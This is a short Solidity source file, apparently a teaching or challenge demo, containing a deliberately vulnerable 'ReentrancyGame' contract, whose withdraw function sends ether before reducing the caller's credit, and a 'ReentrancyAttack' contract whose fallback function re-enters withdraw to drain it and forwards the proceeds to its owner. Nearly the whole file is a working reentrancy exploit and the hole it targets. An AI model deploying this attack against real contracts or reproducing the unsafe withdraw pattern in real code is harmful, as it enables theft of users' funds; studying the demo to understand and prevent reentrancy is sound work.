pragma solidity ^0.4.24;

contract ReentrancyGame {

  mapping (address => uint) public credit;

  event Deposit(address _who, uint value);
  event Withdraw(address _who, uint value);
    
  function deposit() payable public returns (bool) {
    credit[msg.sender] += msg.value;
    emit Deposit(msg.sender, msg.value);
    return true;
  }
    
  function withdraw(uint amount) public returns (bool) {
    if (credit[msg.sender]>= amount) {
      msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
      emit Withdraw(msg.sender, amount);
      return true;
    }
    return false;
  }  

  function creditOf(address to) public returns (uint) {
    return credit[to];
  }
  
  function checkBalance() public constant returns (uint){
      return this.balance;
  }
}

contract ReentrancyAttack {
  ReentrancyGame public regame;
  address owner;

  function ReentrancyAttack (ReentrancyGame addr) payable { 
    owner = msg.sender;
    regame = addr;
  }

  function attack() public returns (bool){
    regame.deposit.value(1)();
    regame.withdraw(1);
    return true;
  }
  
  function geteth() public returns (bool){ 
    owner.transfer(this.balance); 
    return true;
  }

  function checkBalance() public constant returns (uint){
      return this.balance;
  }

  function() public payable { 
    regame.withdraw(1); 
  }
}